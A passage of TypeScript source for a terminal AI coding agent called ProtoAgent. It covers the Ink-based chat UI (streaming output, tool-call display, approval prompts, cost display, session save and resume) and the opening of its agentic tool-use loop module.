      detail = typeof args.search_term === 'string' ? \`"\${args.search_term}"\` : '';
      break;
    case 'bash':
      detail = typeof args.command === 'string'
        ? args.command.split(/\\s+/).slice(0, 3).join(' ') + (args.command.split(/\\s+/).length > 3 ? '...' : '')
        : '';
      break;
    case 'todo_write':
      detail = Array.isArray(args.todos) ? \`\${args.todos.length} task(s)\` : '';
      break;
    case 'todo_read':
      detail = 'read';
      break;
    case 'webfetch':
      detail = typeof args.url === 'string' ? new URL(args.url).hostname : '';
      break;
    case 'sub_agent':
      detail = 'nested task...';
      break;
    default: {
      // For unknown tools, use the first string argument
      const firstEntry = Object.entries(args).find(([, v]) => typeof v === 'string');
      if (firstEntry) {
        const [, value] = firstEntry;
        detail = String(value).length > 30 ? String(value).slice(0, 30) + '...' : String(value);
      }
    }
  }

  if (detail) {
    return \`\${tool} \${detail}\`;
  }

  return tool;
}

function replayMessagesToScrollback(addStatic: AddStaticFn, messages: Message[]): void {  for (const message of messages) {
    const msgAny = message as any;
    if (message.role === 'system') continue;
    if (message.role === 'user' && typeof message.content === 'string') {
      printMessageToScrollback(addStatic, 'user', message.content);
      continue;
    }
    if (message.role === 'assistant' && typeof message.content === 'string' && message.content.trim().length > 0) {
      printMessageToScrollback(addStatic, 'assistant', message.content);
      continue;
    }
    if (message.role === 'tool') {
      const toolName = msgAny.name || 'tool';
      const compact = String(msgAny.content || '').replace(/\\s+/g, ' ').trim().slice(0, 180);
      
      // Format tool display with args if available
      let toolDisplay = toolName;
      if (msgAny.args) {
        try {
          const args = JSON.parse(msgAny.args);
          toolDisplay = formatToolActivity(toolName, args);
        } catch {
          // If parsing fails, use the tool name
        }
      }
      
      addStatic(<Text dimColor>{'▶ '}{toolDisplay}{': '}{compact}{'\\n'}</Text>);
    }
  }
  if (messages.length > 0) {
    addStatic(<Text>{'\\n'}</Text>);
  }
}

// Returns only the last N displayable lines of text so the live streaming box
// never grows taller than the terminal, preventing Ink's clearTerminal wipe.
const STREAMING_RESERVED_ROWS = 3; // usage bar + spinner + input line
function clipToRows(text: string, terminalRows: number): string {
  const maxLines = Math.max(1, terminalRows - STREAMING_RESERVED_ROWS);
  const lines = text.split('\\n');
  if (lines.length <= maxLines) return text;
  return lines.slice(lines.length - maxLines).join('\\n');
}

// ─── Props ───
export interface AppProps {
  dangerouslySkipPermissions?: boolean;
  logLevel?: string;
  sessionId?: string;
}

// ─── Available slash commands ───
const SLASH_COMMANDS = [
  { name: '/help', description: 'Show all available commands' },
  { name: '/quit', description: 'Exit ProtoAgent' },
  { name: '/exit', description: 'Alias for /quit' },
];

const SPINNER_FRAMES = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
const HELP_TEXT = [
  'Commands:',
  '  /help   - Show this help',
  '  /quit   - Exit ProtoAgent',
  '  /exit   - Alias for /quit',
].join('\\n');

function buildClient(config: Config): OpenAI {
  const provider = getProvider(config.provider);
  const apiKey = resolveApiKey(config);

  if (!apiKey) {
    const providerName = provider?.name || config.provider;
    const envVar = provider?.apiKeyEnvVar;
    throw new Error(
      envVar
        ? \`Missing API key for \${providerName}. Set it in config or export \${envVar}.\`
        : \`Missing API key for \${providerName}.\`
    );
  }

  const clientOptions: ConstructorParameters<typeof OpenAI>[0] = {
    apiKey,
  };

  // baseURL: env var override takes precedence over provider default
  const baseURLOverride = process.env.PROTOAGENT_BASE_URL?.trim();
  const baseURL = baseURLOverride || provider?.baseURL;
  if (baseURL) {
    clientOptions.baseURL = baseURL;
  }

  // Custom headers: env override takes precedence over provider defaults
  const rawHeaders = process.env.PROTOAGENT_CUSTOM_HEADERS?.trim();
  if (rawHeaders) {
    const defaultHeaders: Record<string, string> = {};
    for (const line of rawHeaders.split('\\n')) {
      const sep = line.indexOf(': ');
      if (sep === -1) continue;
      const key = line.slice(0, sep).trim();
      const value = line.slice(sep + 2).trim();
      if (key && value) defaultHeaders[key] = value;
    }
    if (Object.keys(defaultHeaders).length > 0) {
      clientOptions.defaultHeaders = defaultHeaders;
    }
  } else if (provider?.headers && Object.keys(provider.headers).length > 0) {
    clientOptions.defaultHeaders = provider.headers;
  }

  return new OpenAI(clientOptions);
}

// ─── Sub-components ───

/** Shows filtered slash commands when user types /. */
const CommandFilter: React.FC<{ inputText: string }> = ({ inputText }) => {
  if (!inputText.startsWith('/')) return null;

  const filtered = SLASH_COMMANDS.filter((cmd) =>
    cmd.name.toLowerCase().startsWith(inputText.toLowerCase())
  );

  if (filtered.length === 0) return null;

  return (
    <Box flexDirection="column" marginBottom={1}>
      {filtered.map((cmd) => (
        <Text key={cmd.name} dimColor>
          <Text color="green">{cmd.name}</Text> — {cmd.description}
        </Text>
      ))}
    </Box>
  );
};

/** Interactive approval prompt rendered inline. */
const ApprovalPrompt: React.FC<{
  request: ApprovalRequest;
  onRespond: (response: ApprovalResponse) => void;
}> = ({ request, onRespond }) => {
  const sessionApprovalLabel = request.sessionScopeKey
    ? 'Approve this operation for session'
    : \`Approve all "\${request.type}" for session\`;

  const items = [
    { label: 'Approve once', value: 'approve_once' as const },
    { label: sessionApprovalLabel, value: 'approve_session' as const },
    { label: 'Reject', value: 'reject' as const },
  ];

  return (
    <LeftBar color="green" marginTop={1} marginBottom={1}>
      <Text color="green" bold>Approval Required</Text>
      <Text>{request.description}</Text>
      {request.detail && (
        <Text dimColor>{request.detail.length > 200 ? request.detail.slice(0, 200) + '...' : request.detail}</Text>
      )}
      <Box marginTop={1}>
        <Select
          options={items.map((item) => ({ value: item.value, label: item.label }))}
          onChange={(value) => onRespond(value as ApprovalResponse)}
        />
      </Box>
    </LeftBar>
  );
};

/** Cost/usage display in the status bar. */
const UsageDisplay: React.FC<{
  usage: { inputTokens: number; outputTokens: number; cost: number; contextPercent: number } | null;
  totalCost: number;
}> = ({ usage, totalCost }) => {
  if (!usage && totalCost === 0) return null;

  return (
    <Box marginTop={1}>
      {usage && (
        <Box>
          <Box backgroundColor="#064e3b" paddingX={1}>
            <Text color="white">tokens: </Text>
            <Text color="white" bold>{usage.inputTokens}↓ {usage.outputTokens}↑</Text>
          </Box>
          <Box backgroundColor="#065f46" paddingX={1}>
            <Text color="white">ctx: </Text>
            <Text color="white" bold>{usage.contextPercent.toFixed(0)}%</Text>
          </Box>
        </Box>
      )}
      {totalCost > 0 && (
        <Box backgroundColor="#064e3b" paddingX={1}>
          <Text color="black">cost: </Text>
          <Text color="black" bold>\${totalCost.toFixed(4)}</Text>
        </Box>
      )}
    </Box>
  );
};

/** Inline setup wizard — shown when no config exists. */
const InlineSetup: React.FC<{
  onComplete: (config: Config) => void;
}> = ({ onComplete }) => {
  const [setupStep, setSetupStep] = useState<'target' | 'provider' | 'api_key'>('target');
  const [target, setTarget] = useState<InitConfigTarget>('project');
  const [selectedProviderId, setSelectedProviderId] = useState('');
  const [selectedModelId, setSelectedModelId] = useState('');

  const handleModelSelect = (providerId: string, modelId: string) => {
    setSelectedProviderId(providerId);
    setSelectedModelId(modelId);
    setSetupStep('api_key');
  };

  const handleConfigComplete = (config: Config) => {
    writeInitConfig(target);
    writeConfig(config, target);
    onComplete(config);
  };

  if (setupStep === 'target') {
    return (
      <Box marginTop={1}>
        <TargetSelection
          title="First-time setup"
          subtitle="Create a ProtoAgent runtime config:"
          onSelect={(value) => {
            setTarget(value);
            setSetupStep('provider');
          }}
        />
      </Box>
    );
  }

  if (setupStep === 'provider') {
    return (
      <Box marginTop={1}>
        <ModelSelection
          setSelectedProviderId={setSelectedProviderId}
          setSelectedModelId={setSelectedModelId}
          onSelect={handleModelSelect}
          title="First-time setup"
        />
      </Box>
    );
  }

  return (
    <Box marginTop={1}>
      <ApiKeyInput
        selectedProviderId={selectedProviderId}
        selectedModelId={selectedModelId}
        target={target}
        title="First-time setup"
        showProviderHeaders={false}
        onComplete={handleConfigComplete}
      />
    </Box>
  );
};

// ─── Main App ───
export const App: React.FC<AppProps> = ({
  dangerouslySkipPermissions = false,
  logLevel,
  sessionId,
}) => {
  const { exit } = useApp();
  const { stdout } = useStdout();
  const terminalRows = stdout?.rows ?? 24;

  // ─── Static scrollback state ───
  // Each item appended here is rendered once by <Static> and permanently
  // flushed to the terminal scrollback by Ink, within its own render cycle.
  // Using <Static> items is important to avoid re-rendering issues, which hijack
  // scrollback and copying when new AI message streams are coming in.
  //
  // staticCounterRef keeps ID generation local to this component instance,
  // making it immune to Strict Mode double-invoke, HMR counter drift, and
  // collisions if multiple App instances ever coexist.
  const staticCounterRef = useRef(0);
  const [staticItems, setStaticItems] = useState<StaticItem[]>([]);
  const addStatic = useCallback((node: React.ReactNode) => {
    staticCounterRef.current += 1;
    const id = \`s\${staticCounterRef.current}\`;
    setStaticItems((prev) => [...prev, { id, node }]);
  }, []);

  // Core state
  const [config, setConfig] = useState<Config | null>(null);
  const [completionMessages, setCompletionMessages] = useState<Message[]>([]);
  const [inputText, setInputText] = useState('');
  // isStreaming: true while the assistant is producing tokens.
  // streamingText: the live in-progress token buffer shown in the dynamic Ink
  // frame while the response streams. Cleared to '' at done and flushed to
  // <Static> as a permanent scrollback item. Keeping it in React state (not a
  // ref) is safe because the Ink frame height does NOT change as tokens arrive —
  // the streaming box is always 1+ lines tall while loading=true.
  const [isStreaming, setIsStreaming] = useState(false);
  const [streamingText, setStreamingText] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [helpMessage, setHelpMessage] = useState<string | null>(null);
  const [threadErrors, setThreadErrors] = useState<InlineThreadError[]>([]);
  const [initialized, setInitialized] = useState(false);
  const [needsSetup, setNeedsSetup] = useState(false);

  // Input reset key — incremented on submit to force TextInput remount and clear
  const [inputResetKey, setInputResetKey] = useState(0);

  // Approval state
  const [pendingApproval, setPendingApproval] = useState<{
    request: ApprovalRequest;
    resolve: (response: ApprovalResponse) => void;
  } | null>(null);

  // Usage state
  const [lastUsage, setLastUsage] = useState<AgentEvent['usage'] | null>(null);
  const [totalCost, setTotalCost] = useState(0);
  const [spinnerFrame, setSpinnerFrame] = useState(0);

  // Active tool tracking — shows which tool is currently executing
  const [activeTool, setActiveTool] = useState<string | null>(null);

  // Session state
  const [session, setSession] = useState<Session | null>(null);

  // Quitting state — shows the resume command before exiting
  const [quittingSession, setQuittingSession] = useState<Session | null>(null);

  // OpenAI client ref (stable across renders)
  const clientRef = useRef<OpenAI | null>(null);
  const assistantMessageRef = useRef<{
    message: any;
    index: number;
    kind: 'streaming_text' | 'tool_call_assistant';
  } | null>(null);

  // Abort controller for cancelling the current completion
  const abortControllerRef = useRef<AbortController | null>(null);

  // Buffer for streaming text that accumulates content and flushes complete lines to static
  // This prevents the live streaming area from growing unbounded - complete lines are
  // immediately flushed to <Static>, only the incomplete final line stays in the dynamic frame
  const streamingBufferRef = useRef<{ unflushedContent: string; hasFlushedAnyLine: boolean }>({
    unflushedContent: '',
    hasFlushedAnyLine: false,
  });

  const didPrintIntroRef = useRef(false);
  const printedThreadErrorIdsRef = useRef<Set<string>>(new Set());

  // ─── Post-config initialization (reused after inline setup) ───

  const initializeWithConfig = useCallback(async (loadedConfig: Config) => {
    setConfig(loadedConfig);

    clientRef.current = buildClient(loadedConfig);

    // Initialize MCP servers
    await initializeMcp();

    // Load or create session
    let loadedSession: Session | null = null;
    if (sessionId) {
      loadedSession = await loadSession(sessionId);
      if (loadedSession) {
        const systemPrompt = await generateSystemPrompt();
        loadedSession.completionMessages = ensureSystemPromptAtTop(
          loadedSession.completionMessages,
          systemPrompt
        );
        setTodosForSession(loadedSession.id, loadedSession.todos);
        setSession(loadedSession);
        setCompletionMessages(loadedSession.completionMessages);
        if (!didPrintIntroRef.current) {
          printBanner(addStatic);
          printRuntimeHeader(addStatic, loadedConfig, loadedSession, dangerouslySkipPermissions);
          replayMessagesToScrollback(addStatic, loadedSession.completionMessages);
          didPrintIntroRef.current = true;
        }
      } else {
        setError(\`Session "\${sessionId}" not found. Starting a new session.\`);
      }
    }

    if (!loadedSession) {
      // Initialize fresh conversation
      const initialCompletionMessages = await initializeMessages();
      setCompletionMessages(initialCompletionMessages);

      const newSession = createSession(loadedConfig.model, loadedConfig.provider);
      clearTodos(newSession.id);
      newSession.completionMessages = initialCompletionMessages;
      setSession(newSession);
      if (!didPrintIntroRef.current) {
        printBanner(addStatic);
        printRuntimeHeader(addStatic, loadedConfig, newSession, dangerouslySkipPermissions);
        didPrintIntroRef.current = true;
      }
    }

    setNeedsSetup(false);
    setInitialized(true);
  }, [dangerouslySkipPermissions, sessionId, addStatic]);

  // ─── Initialization ───

  useEffect(() => {
    if (!loading) {
      setSpinnerFrame(0);
      return;
    }

    const interval = setInterval(() => {
      setSpinnerFrame((prev) => (prev + 1) % SPINNER_FRAMES.length);
    }, 100);

    return () => clearInterval(interval);
  }, [loading]);

  useEffect(() => {
    if (error) {
      addStatic(<Text color="red">Error: {error}</Text>);
    }
  }, [error, addStatic]);



  useEffect(() => {
    for (const threadError of threadErrors) {
      if (threadError.transient || printedThreadErrorIdsRef.current.has(threadError.id)) {
        continue;
      }
      printedThreadErrorIdsRef.current.add(threadError.id);
      addStatic(<Text color="red">Error: {threadError.message}</Text>);
    }
  }, [threadErrors, addStatic]);

  useEffect(() => {
    const init = async () => {
      // Set log level and initialize log file
      if (logLevel) {
        const level = LogLevel[logLevel.toUpperCase() as keyof typeof LogLevel];
        if (level !== undefined) {
          setLogLevel(level);
          initLogFile();

          logger.info(\`ProtoAgent started with log level: \${logLevel}\`);
          logger.info(\`Log file: \${logger.getLogFilePath()}\`);
        }
      }

      // Set global approval mode
      if (dangerouslySkipPermissions) {
        setDangerouslySkipPermissions(true);
      }

      // Register interactive approval handler
      setApprovalHandler(async (req: ApprovalRequest): Promise<ApprovalResponse> => {
        return new Promise((resolve) => {
          setPendingApproval({ request: req, resolve });
        });
      });

      await loadRuntimeConfig();

      const loadedConfig = readConfig('active');
      if (!loadedConfig) {
        setNeedsSetup(true);
        return;
      }

      await initializeWithConfig(loadedConfig);
    };

    init().catch((err) => {
      setError(\`Initialization failed: \${err.message}\`);
    });

    // Cleanup on unmount
    return () => {
      clearApprovalHandler();
      closeMcp();
    };
  }, []);

  // ─── Slash commands ───

  const handleSlashCommand = useCallback(async (cmd: string): Promise<boolean> => {
    const parts = cmd.trim().split(/\\s+/);
    const command = parts[0]?.toLowerCase();

    switch (command) {
        case '/quit':
        case '/exit':
        if (!session) {
          exit();
          return true;
        }

        try {
          const nextSession: Session = {
            ...session,
            completionMessages,
            todos: getTodosForSession(session.id),
            title: generateTitle(completionMessages),
          };

          await saveSession(nextSession);
          setSession(nextSession);
          setQuittingSession(nextSession);
          setError(null);

          // Exit after a short delay to allow render
          setTimeout(() => exit(), 100);
        } catch (err: any) {
          setError(\`Failed to save session before exit: \${err.message}\`);
        }
        return true;
      case '/help':
        setHelpMessage(HELP_TEXT);
        return true;
      default:
        return false;
    }
  }, [config, exit, session, completionMessages]);

  // ─── Submit handler ───

  const handleSubmit = useCallback(async (value: string) => {
    const trimmed = value.trim();
    if (!trimmed || loading || !clientRef.current || !config) return;

    // Handle slash commands
    if (trimmed.startsWith('/')) {
      const handled = await handleSlashCommand(trimmed);
      if (handled) {
        setInputText('');
        setInputResetKey((prev) => prev + 1);
        return;
      }
    }

    setInputText('');
    setInputResetKey((prev) => prev + 1); // Force TextInput to remount and clear
    setLoading(true);
    setIsStreaming(false);
    setStreamingText('');
    setError(null);
    setHelpMessage(null);
    setThreadErrors([]);

    // Reset turn tracking and streaming buffer
    assistantMessageRef.current = null;
    streamingBufferRef.current = { unflushedContent: '', hasFlushedAnyLine: false };

    // Print the user message directly to scrollback so it is selectable/copyable.
    // We still push it into completionMessages for session saving.
    const userMessage: Message = { role: 'user', content: trimmed };
    printMessageToScrollback(addStatic, 'user', trimmed);
    setCompletionMessages((prev) => [...prev, userMessage]);

    // Reset assistant message tracker (streamed indices were reset above)
    assistantMessageRef.current = null;

    try {
      const pricing = getModelPricing(config.provider, config.model);
      const requestDefaults = getRequestDefaultParams(config.provider, config.model);

      // Create abort controller for this completion
      abortControllerRef.current = new AbortController();

      const updatedMessages = await runAgenticLoop(
        clientRef.current,
        config.model,
        [...completionMessages, userMessage],
        trimmed,
        (event: AgentEvent) => {
          switch (event.type) {
            case 'text_delta': {
              const deltaText = event.content || '';

              // First text delta of this turn: initialize ref, show streaming indicator.
              if (!assistantMessageRef.current || assistantMessageRef.current.kind !== 'streaming_text') {
                // Trim leading whitespace from first delta - LLMs often output leading \\n or spaces
                const trimmedDelta = deltaText.replace(/^\\s+/, '');
                const assistantMsg = { role: 'assistant', content: trimmedDelta, tool_calls: [] } as Message;
                const idx = completionMessages.length + 1;
                assistantMessageRef.current = { message: assistantMsg, index: idx, kind: 'streaming_text' };
                setIsStreaming(true);
                setCompletionMessages((prev) => [...prev, assistantMsg]);

                // Initialize the streaming buffer and process the first chunk
                // through the same split logic as subsequent deltas for consistency
                const buffer = { unflushedContent: trimmedDelta, hasFlushedAnyLine: false };
                streamingBufferRef.current = buffer;

                // Process the first chunk: split on newlines and flush complete lines
                const lines = buffer.unflushedContent.split('\\n');
                if (lines.length > 1) {
                  const completeLines = lines.slice(0, -1);
                  const textToFlush = completeLines.join('\\n');
                  if (textToFlush) {
                    addStatic(renderFormattedText(textToFlush));
                    buffer.hasFlushedAnyLine = true;
                  }
                  buffer.unflushedContent = lines[lines.length - 1];
                }

                setStreamingText(buffer.unflushedContent);
              } else {
                // Subsequent deltas — append to ref and buffer, then flush complete lines
                assistantMessageRef.current.message.content += deltaText;

                // Accumulate in buffer and flush complete lines to static
                const buffer = streamingBufferRef.current;
                buffer.unflushedContent += deltaText;

                // Split on newlines to find complete lines
                const lines = buffer.unflushedContent.split('\\n');

                // If we have more than 1 element, there were newlines
                if (lines.length > 1) {
                  // All lines except the last one are complete (ended with \\n)
                  const completeLines = lines.slice(0, -1);

                  // Build the text to flush - each complete line gets a newline added back
                  const textToFlush = completeLines.join('\\n');

                  if (textToFlush) {
                    addStatic(renderFormattedText(textToFlush));
                    buffer.hasFlushedAnyLine = true;
                  }

                  // Keep only the last (incomplete) line in the buffer
                  buffer.unflushedContent = lines[lines.length - 1];
                }

                // Show the incomplete line (if any) in the dynamic frame
                setStreamingText(buffer.unflushedContent);
              }
              break;
            }
            case 'sub_agent_iteration':
              if (event.subAgentTool) {
                const { tool, status, args } = event.subAgentTool;
                if (status === 'running') {
                  setActiveTool(formatSubAgentActivity(tool, args));
                } else {
                  setActiveTool(null);
                }
              }
              // Handle sub-agent usage update
              if (event.subAgentUsage) {
                setTotalCost((prev) => prev + event.subAgentUsage!.cost);
              }
              break;
            case 'tool_call':
              if (event.toolCall) {
                const toolCall = event.toolCall;
                setActiveTool(toolCall.name);

                // If the model streamed some text before invoking this tool,
                // flush any remaining unflushed content to <Static> now.
                // The streaming buffer contains text that hasn't been flushed yet
                // (the incomplete final line). We need to flush it before the tool call.
                if (assistantMessageRef.current?.kind === 'streaming_text') {
                  const buffer = streamingBufferRef.current;

                  // Flush any remaining unflushed content
                  if (buffer.unflushedContent) {
                    addStatic(renderFormattedText(buffer.unflushedContent));
                  }

                  // Add spacing after the streamed text and before the tool call
                  addStatic(renderFormattedText('\\n'));

                  // Reset streaming state and buffer
                  streamingBufferRef.current = { unflushedContent: '', hasFlushedAnyLine: false };
                  setIsStreaming(false);
                  setStreamingText('');
                  assistantMessageRef.current = null;
                }

                // Track the tool call in the ref WITHOUT triggering a render.
                // The render will happen when tool_result arrives.
                const existingRef = assistantMessageRef.current;
                const assistantMsg = existingRef?.message
                  ? {
                      ...existingRef.message,
                      tool_calls: [...(existingRef.message.tool_calls || [])],
                    }
                  : { role: 'assistant', content: '', tool_calls: [] as any[] };

                const nextToolCall = {
                  id: toolCall.id,
                  type: 'function',
                  function: { name: toolCall.name, arguments: toolCall.args },
                };

                const idx = assistantMsg.tool_calls.findIndex(
                  (tc: any) => tc.id === toolCall.id
                );
                if (idx === -1) {
                  assistantMsg.tool_calls.push(nextToolCall);
                } else {
                  assistantMsg.tool_calls[idx] = nextToolCall;
                }

                if (!existingRef) {
                  // First tool call — we need to add the assistant message to state
                  setCompletionMessages((prev) => {
                    assistantMessageRef.current = {
                      message: assistantMsg,
                      index: prev.length,
                      kind: 'tool_call_assistant',
                    };
                    return [...prev, assistantMsg as Message];
                  });
                } else {
                  // Subsequent tool calls — just update the ref, no render
                  assistantMessageRef.current = {
                    ...existingRef,
                    message: assistantMsg,
                    kind: 'tool_call_assistant',
                  };
                }
              }
              break;
            case 'tool_result':
              if (event.toolCall) {
                const toolCall = event.toolCall;
                setActiveTool(null);

                // Write the tool summary immediately — at this point loading is
                // still true but the frame height is stable (spinner + input box).
                // The next state change (setActiveTool(null)) doesn't affect
                // frame height so write() restores the correct frame.
                const compactResult = (toolCall.result || '')
                  .replace(/\\s+/g, ' ')
                  .trim()
                  .slice(0, 180);
                
                // Parse tool args to show relevant parameter
                let toolDisplay = toolCall.name;
                try {
                  const args = JSON.parse(toolCall.args || '{}');
                  toolDisplay = formatToolActivity(toolCall.name, args);
                } catch {
                  // If parsing fails, just use the tool name
                }
                
                addStatic(<Text dimColor>{'▶ '}{toolDisplay}{': '}{compactResult}{'\\n'}</Text>);

                // Flush the assistant message + tool result into completionMessages
                // for session saving.
                setCompletionMessages((prev) => {
                  const updated = [...prev];
                  // Sync assistant message
                  if (assistantMessageRef.current) {
                    updated[assistantMessageRef.current.index] = {
                      ...assistantMessageRef.current.message,
                    };
                  }
                  // Append tool result with args for replay
                  updated.push({
                    role: 'tool',
                    tool_call_id: toolCall.id,
                    content: toolCall.result || '',
                    name: toolCall.name,
                    args: toolCall.args,
                  } as any);
                  return updated;
                });
              }
              break;
            case 'usage':
              if (event.usage) {
                setLastUsage(event.usage);
                setTotalCost((prev) => prev + event.usage!.cost);
              }
              break;
            case 'error':
              if (event.error) {
                const errorMessage = event.error;
                setThreadErrors((prev) => {
                  if (event.transient) {
                    return [
                      ...prev.filter((threadError) => !threadError.transient),
                      {
                        id: \`\${Date.now()}-\${prev.length}\`,
                        message: errorMessage,
                        transient: true,
                      },
                    ];
                  }

                  if (prev[prev.length - 1]?.message === errorMessage) {
                    return prev;
                  }

                  return [
                    ...prev,
                    {
                      id: \`\${Date.now()}-\${prev.length}\`,
                      message: errorMessage,
                      transient: false,
                    },
                  ];
                });
              } else {
                setError('Unknown error');
              }
              break;
            case 'iteration_done':
              if (assistantMessageRef.current?.kind === 'tool_call_assistant') {
                assistantMessageRef.current = null;
              }
              break;
            case 'done':
              if (assistantMessageRef.current?.kind === 'streaming_text') {
                const finalRef = assistantMessageRef.current;
                const buffer = streamingBufferRef.current;

                // Flush any remaining unflushed content from the buffer
                // This is the final incomplete line that was being displayed live
                if (buffer.unflushedContent) {
                  // If we've already flushed some lines, just append the remainder
                  // Otherwise, normalize and flush the full content
                  if (buffer.hasFlushedAnyLine) {
                    addStatic(renderFormattedText(buffer.unflushedContent));
                  } else {
                    // Nothing was flushed yet, normalize the full content
                    const normalized = normalizeTranscriptText(finalRef.message.content || '');
                    if (normalized) {
                      addStatic(renderFormattedText(normalized));
                    }
                  }
                }

                // Add final spacing after the streamed text
                // Always add one newline - the user message adds another for blank line separation
                if (buffer.unflushedContent) {
                  addStatic(renderFormattedText('\\n'));
                }

                // Clear streaming state and buffer
                setIsStreaming(false);
                setStreamingText('');
                streamingBufferRef.current = { unflushedContent: '', hasFlushedAnyLine: false };
                setCompletionMessages((prev) => {
                  const updated = [...prev];
                  updated[finalRef.index] = { ...finalRef.message };
                  return updated;
                });
                assistantMessageRef.current = null;
              }
              setActiveTool(null);
              setThreadErrors((prev) => prev.filter((threadError) => !threadError.transient));
              break;
          }
        },
        {
          pricing: pricing || undefined,
          abortSignal: abortControllerRef.current.signal,
          sessionId: session?.id,
          requestDefaults,
        }
      );

      // Final update to ensure we have the complete message history
      setCompletionMessages(updatedMessages);

      // Update session
      if (session) {
        session.completionMessages = updatedMessages;
        session.todos = getTodosForSession(session.id);
        session.title = generateTitle(updatedMessages);
        await saveSession(session);
      }
    } catch (err: any) {
      setError(\`Error: \${err.message}\`);
    } finally {
      setLoading(false);
    }
  }, [loading, config, completionMessages, session, handleSlashCommand, addStatic]);

  // ─── Keyboard shortcuts ───

  useInput((input, key) => {
    if (key.ctrl && input === 'c') {
      exit();
    }
    if (key.escape && loading && abortControllerRef.current) {
      // Abort the current completion
      abortControllerRef.current.abort();
    }
  });

  // ─── Render ───

  return (
    <Box flexDirection="column">
      {/* Permanent scrollback — Ink flushes new items once within its render cycle */}
      <Static items={staticItems}>
        {(item) => (
          <Text key={item.id}>{item.node}</Text>
        )}
      </Static>

      {helpMessage && (
        <LeftBar color="green" marginTop={1} marginBottom={1}>
          <Text>{helpMessage}</Text>
        </LeftBar>
      )}
      {!initialized && !error && !needsSetup && <Text>Initializing...</Text>}

      {/* Inline setup wizard */}
      {needsSetup && (
        <InlineSetup
          onComplete={(newConfig) => {
            initializeWithConfig(newConfig).catch((err) => {
              setError(\`Initialization failed: \${err.message}\`);
            });
          }}
        />
      )}

      {isStreaming && (
        <Text wrap="wrap">{renderFormattedText(clipToRows(streamingText, terminalRows))}<Text dimColor>▍</Text></Text>
      )}

      {threadErrors.filter((threadError) => threadError.transient).map((threadError) => (
        <LeftBar key={\`thread-error-\${threadError.id}\`} color="gray" marginBottom={1}>
          <Text color="gray">{threadError.message}</Text>
        </LeftBar>
      ))}

      {/* Approval prompt */}
      {pendingApproval && (
        <ApprovalPrompt
          request={pendingApproval.request}
          onRespond={(response) => {
            pendingApproval.resolve(response);
            setPendingApproval(null);
          }}
        />
      )}

      {/* Working indicator */}
      {initialized && !pendingApproval && loading && !isStreaming && (
        <Box>
          <Text color="green" bold>
            {SPINNER_FRAMES[spinnerFrame]}{' '}
            {activeTool ? \`Running \${activeTool}...\` : 'Working...'}
          </Text>
        </Box>
      )}

      {/* Command filter */}
      {initialized && !pendingApproval && inputText.startsWith('/') && (
        <CommandFilter inputText={inputText} />
      )}

      {/* Usage bar */}
      <UsageDisplay usage={lastUsage ?? null} totalCost={totalCost} />

      {/* Input */}
      {initialized && !pendingApproval && (
        <Box>
          <Box flexDirection="row">
            <Box width={2} flexShrink={0}>
              <Text color="green" bold>{'>'}</Text>
            </Box>
            <Box flexGrow={1} minWidth={10}>
              <TextInput
                key={inputResetKey}
                defaultValue={inputText}
                onChange={setInputText}
                placeholder="Type your message... (/help for commands)"
                onSubmit={handleSubmit}
              />
            </Box>
          </Box>
        </Box>
      )}

      {/* Resume session command */}
      {quittingSession && (
        <Box flexDirection="column" marginTop={1} paddingX={1} marginBottom={1}>
          <Text dimColor>Session saved. Resume with:</Text>
          <Text color="green">protoagent --session {quittingSession.id}</Text>
        </Box>
      )}
    </Box>
  );
};
`,
  },
  {
    path: "src/agentic-loop.ts",
    content: `/**
 * The agentic loop — the core of ProtoAgent.
 *
 * This module implements the standard tool-use loop:
 *
 *  1. Send the conversation to the LLM with tool definitions
 *  2. If the response contains tool_calls:
 *     a. Execute each tool
 *     b. Append the results to the conversation
 *     c. Go to step 1
 *  3. If the response is plain text:
 *     a. Return it to the caller (the UI renders it)
 *
 * The loop is a plain TypeScript module — not an Ink component.
 * The UI subscribes to events emitted by the loop and updates
 * React state accordingly. This keeps the core logic testable
 * and UI-independent.
 */

import type OpenAI from 'openai';
import { setMaxListeners } from 'node:events';
import { getAllTools, handleToolCall } from './tools/index.js';
import { generateSystemPrompt } from './system-prompt.js';
import { subAgentTool, runSubAgent, type SubAgentProgressHandler } from './sub-agent.js';
import {
  estimateTokens,
  estimateConversationTokens,
  createUsageInfo,
  getContextInfo,
  type ModelPricing,
} from './utils/cost-tracker.js';
import { compactIfNeeded } from './utils/compactor.js';
import { logger } from './utils/logger.js';

// ─── Types ───

export type Message = OpenAI.Chat.Completions.ChatCompletionMessageParam;

export interface ToolCallEvent {
  id: string;
  name: string;
  args: string;
  status: 'running' | 'done' | 'error';
  result?: string;
}

export interface AgentEvent {
  type: 'text_delta' | 'tool_call' | 'tool_result' | 'usage' | 'error' | 'done' | 'iteration_done' | 'sub_agent_iteration';
  content?: string;
  toolCall?: ToolCallEvent;
  /** Emitted while a sub-agent is executing — carries the child tool name and iteration status.
   *  Distinct from \`tool_call\` so the UI can show it as a nested progress indicator
   *  without adding it to the parent's tool-call message history. */
  subAgentTool?: { tool: string; status: 'running' | 'done' | 'error'; iteration: number; args?: Record<string, unknown> };
  usage?: { inputTokens: number; outputTokens: number; cost: number; contextPercent: number };
  /** Emitted when a sub-agent completes, carrying its accumulated usage. */
  subAgentUsage?: { inputTokens: number; outputTokens: number; cost: number };
  error?: string;
  transient?: boolean;
}

export type AgentEventHandler = (event: AgentEvent) => void;

// ─── Agentic Loop ───

export interface AgenticLoopOptions {
  maxIterations?: number;
  pricing?: ModelPricing;
  abortSignal?: AbortSignal;
  sessionId?: string;
  requestDefaults?: Record<string, unknown>;
}

function emitAbortAndFinish(onEvent: AgentEventHandler): void {
  onEvent({ type: 'done' });
}

async function sleepWithAbort(delayMs: number, abortSignal?: AbortSignal): Promise<void> {
  if (!abortSignal) {
    await new Promise((resolve) => setTimeout(resolve, delayMs));
    return;
  }

  if (abortSignal.aborted) {
    throw new Error('Operation aborted');
  }

  await new Promise<void>((resolve, reject) => {
    const timer = setTimeout(() => {
      abortSignal.removeEventListener('abort', onAbort);
      resolve();
    }, delayMs);

    const onAbort = () => {
      clearTimeout(timer);
      abortSignal.removeEventListener('abort', onAbort);
      reject(new Error('Operation aborted'));
    };

    abortSignal.addEventListener('abort', onAbort, { once: true });
  });
}

/** @internal exported for unit testing only */
export function appendStreamingFragment(current: string, fragment: string): string {
  if (!fragment) return current;
  if (!current) return fragment;
